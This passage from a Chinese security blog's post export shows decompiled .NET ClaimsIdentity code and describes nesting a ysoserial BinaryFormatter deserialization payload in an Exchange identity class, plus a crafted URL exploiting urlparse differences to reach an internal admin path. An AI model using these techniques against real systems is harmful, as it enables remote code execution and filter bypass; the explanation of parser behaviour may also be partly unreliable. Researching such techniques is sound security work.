class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-comment">// System.Security.Claims.ClaimsIdentity</span><br>[<span class="hljs-meta">OnDeserialized</span>]<br>[<span class="hljs-meta">SecurityCritical</span>]<br><span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">OnDeserializedMethod</span>(<span class="hljs-params">StreamingContext context</span>)</span><br>&#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">this</span> <span class="hljs-keyword">is</span> ISerializable)<br>    &#123;<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">string</span>.IsNullOrEmpty(<span class="hljs-keyword">this</span>.m_serializedClaims))<br>    &#123;<br>        <span class="hljs-keyword">this</span>.DeserializeClaims(<span class="hljs-keyword">this</span>.m_serializedClaims);<br>        <span class="hljs-keyword">this</span>.m_serializedClaims = <span class="hljs-literal">null</span>;<br>    &#125;<br>    <span class="hljs-keyword">this</span>.m_nameType = (<span class="hljs-built_in">string</span>.IsNullOrEmpty(<span class="hljs-keyword">this</span>.m_serializedNameType) ? <span class="hljs-string">&quot;http://schemas.xmlsoap.org/ws/2005/05/identity/claims/name&quot;</span> : <span class="hljs-keyword">this</span>.m_serializedNameType);<br>    <span class="hljs-keyword">this</span>.m_roleType = (<span class="hljs-built_in">string</span>.IsNullOrEmpty(<span class="hljs-keyword">this</span>.m_serializedRoleType) ? <span class="hljs-string">&quot;http://schemas.microsoft.com/ws/2008/06/identity/claims/role&quot;</span> : <span class="hljs-keyword">this</span>.m_serializedRoleType);<br>&#125;<br></code></pre></td></tr></table></figure><p><code>DeserializeClaims</code> 将数据 base64 解码后同样也使用了 <code>BinaryFormatter</code> 进行进一步反序列化。</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-comment">// System.Security.Claims.ClaimsIdentity</span><br>[<span class="hljs-meta">SecurityCritical</span>]<br><span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">DeserializeClaims</span>(<span class="hljs-params"><span class="hljs-built_in">string</span> serializedClaims</span>)</span><br>&#123;<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">string</span>.IsNullOrEmpty(serializedClaims))<br>    &#123;<br>        <span class="hljs-keyword">using</span> (MemoryStream memoryStream = <span class="hljs-keyword">new</span> MemoryStream(Convert.FromBase64String(serializedClaims)))<br>        &#123;<br>            <span class="hljs-keyword">this</span>.m_instanceClaims = (List&lt;Claim&gt;)<span class="hljs-keyword">new</span> BinaryFormatter().Deserialize(memoryStream, <span class="hljs-literal">null</span>, <span class="hljs-literal">false</span>);<br>            <span class="hljs-keyword">for</span> (<span class="hljs-built_in">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-keyword">this</span>.m_instanceClaims.Count; i++)<br>            &#123;<br>                <span class="hljs-keyword">this</span>.m_instanceClaims[i].Subject = <span class="hljs-keyword">this</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">this</span>.m_instanceClaims == <span class="hljs-literal">null</span>)<br>    &#123;<br>        <span class="hljs-keyword">this</span>.m_instanceClaims = <span class="hljs-keyword">new</span> List&lt;Claim&gt;();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>故首先利用 yso 生成 <code>ClaimsIdentity</code> 的 <code>BinaryFormatter</code> 的反序列化 payload，再将 payload 的 b64 编码数据通过反射放入 <code>ClaimsIdentity</code> 的 <code>m_serializedClaims</code> 中。也就是 <code>Microsoft.Exchange.Security.Authentication.GenericSidIdentity</code> 的 <code>m_serializedClaims</code> 中，再将这个类通过 <code>BinaryFormatter</code> 进行序列化，就得到了可用的 payload。</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>一些tricks</title>
    <link href="/2023/05/31/%E4%B8%80%E4%BA%9Btrick/"/>
    <url>/2023/05/31/%E4%B8%80%E4%BA%9Btrick/</url>
    
    <content type="html"><![CDATA[<h2 id="urlparse解析不一致"><a href="#urlparse解析不一致" class="headerlink" title="urlparse解析不一致"></a>urlparse解析不一致</h2><p>关于<a href="http://172.18.19.3:8000/admin/%E7%9A%84%E8%A7%A3%E6%9E%90">http://172.18.19.3:8000\@www.aliyun.com/../admin/的解析</a></p><p>URL字符串确实会导致<code>urllib.parse.urlparse</code>和<code>requests.compat.urlparse</code>在解析上产生差异。</p><p>在<code>urllib.parse.urlparse</code>中，对于给定的URL字符串，<code>urlparse</code>函数会将其解析为以下组成部分：</p><ul><li>scheme: ‘http’</li><li>netloc: ‘172.18.19.3:<a href="mailto:&#56;&#48;&#x30;&#x30;&#64;&#x77;&#x77;&#119;&#x2e;&#x61;&#x6c;&#x69;&#x79;&#x75;&#x6e;&#46;&#99;&#111;&#109;">&#56;&#48;&#x30;&#x30;&#64;&#x77;&#x77;&#119;&#x2e;&#x61;&#x6c;&#x69;&#x79;&#x75;&#x6e;&#46;&#99;&#111;&#109;</a>‘</li><li>path: ‘&#x2F;..&#x2F;admin&#x2F;‘</li></ul><p>而在<code>requests.compat.urlparse</code>中，对于相同的URL字符串，<code>urlparse</code>函数的解析结果将会是：</p><ul><li>scheme: ‘http’</li><li>netloc: ‘172.18.19.3:8000’</li><li>path: ‘&#x2F;@<a href="http://www.aliyun.com/admin/&#39;">www.aliyun.com/../admin/&#39;</a></li></ul><p>可以看到，<code>urllib.parse.urlparse</code>将整个URL字符串作为<code>netloc</code>的一部分，而<code>requests.compat.urlparse</code>将其分割成了<code>netloc</code>和<code>path</code>。</p><p>这个问题的根源在于URL字符串中包含了非标准的字符，导致不同的解析器对其解析的方式产生差异。具体来说，URL字符串中的<code>\@</code>序列在不同的解析器中被解释为不同的内容。</p><p><code>urllib.parse.urlparse</code>是Python标准库中的URL解析函数，遵循RFC 3986标准对URL进行解析。根据该标准，<code>@</code>符号在URL中是一个保留字符，通常用于表示用户名和密码的分隔符。但是，<code>\@</code>序列在RFC 3986标准中没有定义，因此在<code>urllib.parse.urlparse</code>中，<code>\@</code>被视为普通字符的一部分，与后续的URL部分一起构成<code>netloc</code>。</p><p>而在<code>requests.compat.urlparse</code>中，可能是为了更好地与HTTP请求兼容，对<code>\@</code>序列进行了特殊处理。在该解析器中，<code>\@</code>被解释为一个普通的<code>@</code>符号，将<code>netloc</code>和<code>path</code>正确地分隔开。</p><p>因此，对于包含<code>\@</code>序列的URL字符串，<code>urllib.parse.urlparse</code>和<code>requests.compat.urlparse</code>解析结果的差异是由于它们对URL字符的解释方式不同所致。</p><h2 id="IPv4-mapped-IPv6"><a href="#IPv4-mapped-IPv6" class="headerlink" title="IPv4-mapped IPv6"></a>IPv4-mapped IPv6</h2><p>IPv4-mapped IPv6 地址是一种特殊的 IPv6 地址格式，用于将 IPv4 地址映射到 IPv6 地址空间中。它允许 IPv4 和 IPv6 网络之间的互操作性和过渡。</p><p>IPv4-mapped IPv6 地址的格式如下：</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ruby">rubyCopy code<br><span class="hljs-symbol">:</span><span class="hljs-symbol">:ffff</span><span class="hljs-symbol">:IPv4Address</span><br></code></pre></td></tr></table></figure><p>其中 <code>IPv4Address</code> 是一个标准的 IPv4 地址（例如，<code>192.0.2.1</code>）。</p><p>这种地址格式的前缀 <code>::ffff:</code> 表示这是一个 IPv4-mapped IPv6 地址。通过在 IPv6 地址的高位部分添加 <code>::ffff:</code> 前缀，IPv4 地址可以被表示为 IPv6 地址的一部分。</p><p>例如，如果有一个 IPv4 地址 <code>192.0.2.1</code>，对应的 IPv4-mapped IPv6 地址将是 <code>::ffff:192.0.2.1</code>。</p><p>IPv4-mapped IPv6 地址主要用于在 IPv6 网络中支持与 IPv4 网络的通信。这种格式的地址允许 IPv6 主机直接与 IPv4 主机进行通信，而无需进行地址转换。然而，要注意的是，IPv4-mapped IPv6 地址仅在受支持的网络设备和协议中才能被正确处理和识别。</p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
